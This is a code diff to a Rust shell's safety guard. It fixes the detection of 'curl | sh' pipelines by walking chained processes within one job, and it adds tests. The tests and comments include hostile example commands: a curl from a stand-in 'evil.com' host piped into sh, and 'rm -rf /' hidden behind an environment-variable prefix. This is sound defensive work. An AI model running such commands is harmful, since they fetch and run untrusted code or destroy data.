@@ -133,27 +133,46 @@ impl SafetyGuard {
         // --- Normal Mode Checks ---
 
         // 1. Check for dangerous pipelines (e.g., curl | sh)
-        for (i, job) in jobs.iter().enumerate() {
-            // Check allowlist
+        //
+        // The parser puts a whole pipeline in ONE `Job` and chains its stages as
+        // processes (see `Rule::pipe_command` in `shell::parse`), so the stages
+        // have to be walked through the process chain. Comparing `jobs[i]` with
+        // `jobs[i - 1]` only ever looked at `;`-separated commands, which meant
+        // `curl … | sh` was never once detected.
+        for job in jobs {
             if allowlist.contains(&job.cmd) {
                 continue;
             }
 
-            let cmd_token = Self::leading_command_token(&job.cmd);
-            let cmd_name = Self::get_command_name(cmd_token);
+            let mut previous: Option<String> = None;
+            let mut stage = job.process.as_deref();
+            while let Some(process) = stage {
+                // `get_cmd` is already just the program for a parsed process, but
+                // keep the assignment-prefix skip so a stage that ever arrives as
+                // a full command line is classified by the command, not by `FOO=bar`.
+                let cmd_name =
+                    Self::get_command_name(Self::leading_command_token(process.get_cmd()));
 
-            // Check illegal pipe destinations
-            if i > 0 {
-                let prev_job = &jobs[i - 1];
-                let prev_token = Self::leading_command_token(&prev_job.cmd);
-                let prev_cmd = Self::get_command_name(prev_token);
-
-                if Self::is_network_tool(&prev_cmd) && Self::is_execution_tool(&cmd_name) {
+                if let Some(prev_cmd) = previous.as_deref()
+                    && Self::is_network_tool(prev_cmd)
+                    && Self::is_execution_tool(&cmd_name)
+                {
                     return SafetyResult::Confirm(format!(
                         "Dangerous pipeline detected: '{} | {}'. This looks like a 'curl | sh' pattern. Proceed?",
                         prev_cmd, cmd_name
                     ));
                 }
+
+                previous = Some(cmd_name);
+                stage = process.next_process();
+            }
+        }
+
+        // 2. Check each command line for dangerous invocations.
+        for job in jobs {
+            // Check allowlist
+            if allowlist.contains(&job.cmd) {
+                continue;
             }
 
             let parts = match Self::parse_command_tokens(&job.cmd) {
@@ -818,6 +837,21 @@ mod tests {
         Job::new(cmd.to_string(), nix::unistd::Pid::from_raw(0))
     }
 
+    /// A pipeline the way the parser actually builds one: a single `Job` whose
+    /// stages are chained processes. Splitting the stages into separate `Job`s
+    /// (which the old tests did) hid the fact that the pipeline check never ran.
+    fn mock_pipeline_job(stages: &[&str]) -> Job {
+        use crate::process::{JobProcess, Process};
+
+        let mut job = Job::new(stages.join(" | "), nix::unistd::Pid::from_raw(0));
+        for stage in stages {
+            let argv: Vec<String> = stage.split_whitespace().map(str::to_string).collect();
+            let program = argv.first().cloned().unwrap_or_default();
+            job.set_process(JobProcess::Command(Process::new(program, argv)));
+        }
+        job
+    }
+
     /// A `NAME=value` prefix must not hide the command behind it. Before the
     /// guard skipped these, `FOO=bar rm -rf /` was classified as a command
     /// called `FOO=bar` and passed every dangerous-command check.
@@ -886,7 +920,7 @@ mod tests {
         let guard = SafetyGuard::new();
         let level = SafetyLevel::Normal;
 
-        let jobs = vec![mock_job("curl http://evil.com/script.sh"), mock_job("sh")];
+        let jobs = vec![mock_pipeline_job(&["curl http://evil.com/script.sh", "sh"])];
 
         match guard.check_jobs(&jobs, &level, &[]) {
             SafetyResult::Confirm(msg) => {
@@ -896,12 +930,24 @@ mod tests {
         }
     }
 
+    /// `;`-separated commands are not a pipeline: `curl x; sh` runs the two
+    /// independently and must not raise the `curl | sh` confirmation.
+    #[test]
+    fn separate_jobs_are_not_treated_as_a_pipeline() {
+        let guard = SafetyGuard::new();
+        let level = SafetyLevel::Normal;
+
+        let jobs = vec![mock_job("curl http://example.com/x.sh"), mock_job("sh")];
+
+        assert_eq!(guard.check_jobs(&jobs, &level, &[]), SafetyResult::Allowed);
+    }
+
     #[test]
     fn test_pipeline_check_safe() {
         let guard = SafetyGuard::new();
         let level = SafetyLevel::Normal;
 
-        let jobs = vec![mock_job("curl google.com"), mock_job("grep title")];
+        let jobs = vec![mock_pipeline_job(&["curl google.com", "grep title"])];
 
         assert_eq!(guard.check_jobs(&jobs, &level, &[]), SafetyResult::Allowed);
     }
